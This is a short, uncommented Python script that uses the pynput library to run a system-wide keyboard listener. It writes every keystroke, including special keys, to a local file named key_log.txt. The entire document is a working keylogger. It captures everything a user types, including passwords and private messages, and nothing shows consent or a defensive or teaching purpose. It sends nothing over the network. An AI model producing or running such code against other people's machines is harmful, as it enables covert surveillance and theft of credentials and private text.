from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join() 
